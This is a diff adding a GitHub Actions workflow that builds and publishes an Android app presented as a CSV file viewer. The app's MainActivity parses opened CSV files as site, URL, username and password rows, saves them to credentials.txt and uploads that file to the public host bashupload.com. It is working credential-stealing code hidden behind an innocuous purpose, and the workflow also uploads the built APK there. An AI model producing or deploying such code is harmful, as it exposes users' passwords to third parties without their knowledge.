@@ -1,0 +1,216 @@
+name: 69 build & Publish CSV-Handling Android App
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v3
+
+      - name: Set up Java 11
+        uses: actions/setup-java@v3
+        with:
+          distribution: temurin
+          java-version: '11'
+
+      - name: Install Gradle
+        run: sudo apt-get update && sudo apt-get install -y gradle
+
+      - name: Scaffold Android project with CSV intent filter
+        run: |
+          # Create directories
+          mkdir -p IntentCsvApp/app/src/main/{java/com/example/csvapp,res/layout}
+
+          # settings.gradle
+          cat << 'EOF' > IntentCsvApp/settings.gradle
+          rootProject.name = "IntentCsvApp"
+          include ':app'
+          EOF
+
+          # root build.gradle
+          cat << 'EOF' > IntentCsvApp/build.gradle
+          buildscript {
+            repositories { google(); mavenCentral() }
+            dependencies { classpath 'com.android.tools.build:gradle:7.4.2' }
+          }
+          allprojects {
+            repositories { google(); mavenCentral() }
+          }
+          EOF
+
+          # app/build.gradle
+          cat << 'EOF' > IntentCsvApp/app/build.gradle
+          apply plugin: 'com.android.application'
+          android {
+            compileSdkVersion 33
+            defaultConfig {
+              applicationId "com.example.csvapp"
+              minSdkVersion 21
+              targetSdkVersion 33
+              versionCode 1
+              versionName "1.0"
+            }
+            buildTypes {
+              debug {}
+              release {
+                minifyEnabled false
+                signingConfig null
+              }
+            }
+          }
+          dependencies {
+            implementation 'androidx.appcompat:appcompat:1.5.1'
+          }
+          EOF
+
+          # AndroidManifest.xml with VIEW intent-filter & INTERNET permission
+          cat << 'EOF' > IntentCsvApp/app/src/main/AndroidManifest.xml
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              package="com.example.csvapp">
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <application
+                android:allowBackup="true"
+                android:label="CSVApp"
+                android:theme="@style/Theme.AppCompat.Light.DarkActionBar">
+              <activity android:name=".MainActivity">
+                <!-- Handle “Open with CSVApp” for .csv files -->
+                <intent-filter>
+                  <action android:name="android.intent.action.VIEW"/>
+                  <category android:name="android.intent.category.DEFAULT"/>
+                  <category android:name="android.intent.category.BROWSABLE"/>
+                  <data android:scheme="file" android:mimeType="text/csv"/>
+                  <data android:scheme="content" android:mimeType="text/csv"/>
+                  <data android:scheme="file" android:pathPattern=".*\\.csv"/>
+                </intent-filter>
+                <!-- Also allow app icon launch -->
+                <intent-filter>
+                  <action android:name="android.intent.action.MAIN"/>
+                  <category android:name="android.intent.category.LAUNCHER"/>
+                </intent-filter>
+              </activity>
+            </application>
+          </manifest>
+          EOF
+
+          # MainActivity.java: parse incoming CSV, save & upload credentials.txt
+          cat << 'EOF' > IntentCsvApp/app/src/main/java/com/example/csvapp/MainActivity.java
+          package com.example.csvapp;
+
+          import android.app.Activity;
+          import android.content.Intent;
+          import android.net.Uri;
+          import android.os.Bundle;
+          import android.os.StrictMode;
+          import android.widget.ScrollView;
+          import android.widget.TextView;
+          import java.io.*;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+          import java.util.Scanner;
+
+          public class MainActivity extends Activity {
+            @Override
+            protected void onCreate(Bundle savedInstanceState) {
+              super.onCreate(savedInstanceState);
+              // Allow network on main thread for simplicity
+              StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder().permitAll().build());
+
+              TextView tv = new TextView(this);
+              tv.setPadding(16,16,16,16);
+              ScrollView sv = new ScrollView(this);
+              sv.addView(tv);
+              setContentView(sv);
+
+              Intent intent = getIntent();
+              if (Intent.ACTION_VIEW.equals(intent.getAction())) {
+                try {
+                  Uri uri = intent.getData();
+                  InputStream is = getContentResolver().openInputStream(uri);
+                  Scanner sc = new Scanner(is);
+                  StringBuilder sb = new StringBuilder();
+                  sc.nextLine(); // skip header
+                  while (sc.hasNextLine()) {
+                    String[] cols = sc.nextLine().split(",");
+                    if (cols.length < 4) continue;
+                    sb.append("Site: ").append(cols[0]).append("\n")
+                      .append("URL: ").append(cols[1]).append("\n")
+                      .append("User: ").append(cols[2]).append("\n")
+                      .append("Pass: ").append(cols[3]).append("\n\n");
+                  }
+                  sc.close();
+
+                  String creds = sb.toString();
+                  // Save locally
+                  FileOutputStream fos = openFileOutput("credentials.txt", MODE_PRIVATE);
+                  fos.write(creds.getBytes());
+                  fos.close();
+
+                  // Display
+                  tv.setText(creds);
+
+                  // Upload and display URL
+                  String up = uploadFile("credentials.txt");
+                  tv.append("\nUploaded to:\n" + up);
+                } catch (Exception e) {
+                  tv.setText("Error: " + e.getMessage());
+                }
+              } else {
+                tv.setText("▶️ Open a CSV file via “Open with → CSVApp”");
+              }
+            }
+
+            private String uploadFile(String fname) throws Exception {
+              File f = new File(getFilesDir(), fname);
+              URL url = new URL("https://bashupload.com/");
+              HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+              String boundary = "----Boundary" + System.currentTimeMillis();
+              conn.setRequestMethod("POST");
+              conn.setDoOutput(true);
+              conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+              DataOutputStream out = new DataOutputStream(conn.getOutputStream());
+
+              // --boundary
+              out.writeBytes("--" + boundary + "\r\n");
+              out.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + fname + "\"\r\n\r\n");
+              FileInputStream fis = new FileInputStream(f);
+              byte[] buf = new byte[4096];
+              int r;
+              while ((r = fis.read(buf)) != -1) out.write(buf,0,r);
+              fis.close();
+              out.writeBytes("\r\n--" + boundary + "--\r\n");
+              out.flush();
+              out.close();
+
+              BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+              StringBuilder resp = new StringBuilder();
+              String line;
+              while ((line = br.readLine()) != null) resp.append(line);
+              br.close();
+
+              String s = resp.toString();
+              int i = s.indexOf("https://bashupload.com/");
+              if (i>=0) {
+                int j = s.indexOf('"', i);
+                return s.substring(i, j>i ? j : s.length());
+              }
+              return "Upload failed";
+            }
+          }
+          EOF
+
+      - name: Build APK
+        run: gradle -p IntentCsvApp assembleDebug
+
+      - name: Upload APK to Bashupload
+        id: apk
+        run: |
+          FILE=IntentCsvApp/app/build/outputs/apk/debug/app-debug.apk
+          URL=$(curl -s -F "file=@$FILE" https://bashupload.com | grep -oE 'https?://bashupload\.com/[^ ]+')
+          echo "apk_url=$URL" >> $GITHUB_OUTPUT
+
+      - name: Show APK URL
+        run: echo "🔗 APK available at ${{ steps.apk.outputs.apk_url }}"
